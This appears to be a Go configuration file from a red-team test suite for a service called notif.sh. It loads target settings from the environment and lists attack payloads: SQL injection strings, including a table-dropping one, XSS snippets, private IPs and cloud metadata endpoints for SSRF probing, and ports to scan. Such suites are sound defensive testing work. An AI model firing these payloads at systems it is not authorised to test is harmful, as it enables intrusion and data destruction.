// Package exploits contains security testing utilities for notif.sh
package exploits

import (
	"os"
	"strings"
)

// Config holds red team test configuration
type Config struct {
	TargetURL   string
	WSTargetURL string
	APIKey      string
}

// LoadConfig loads configuration from environment
func LoadConfig() Config {
	target := os.Getenv("REDTEAM_TARGET")
	if target == "" {
		target = "http://localhost:8080"
	}

	wsTarget := os.Getenv("REDTEAM_WS_TARGET")
	if wsTarget == "" {
		wsTarget = strings.Replace(target, "http", "ws", 1) + "/ws"
	}

	return Config{
		TargetURL:   target,
		WSTargetURL: wsTarget,
		APIKey:      os.Getenv("REDTEAM_API_KEY"),
	}
}

// Common payloads
var (
	// Private IP ranges for SSRF testing
	PrivateIPs = []string{
		"127.0.0.1",
		"localhost",
		"0.0.0.0",
		"10.0.0.1",
		"172.16.0.1",
		"192.168.1.1",
		"169.254.169.254", // AWS metadata
		"metadata.google.internal", // GCP metadata
	}

	// Common ports for port scanning
	CommonPorts = []int{22, 80, 443, 3306, 5432, 6379, 8080, 9200}

	// SQL injection payloads
	SQLiPayloads = []string{
		"' OR '1'='1",
		"'; DROP TABLE users; --",
		"1; SELECT * FROM api_keys",
		"' UNION SELECT * FROM api_keys --",
	}

	// XSS payloads (for webhook responses)
	XSSPayloads = []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"javascript:alert(1)",
	}
)
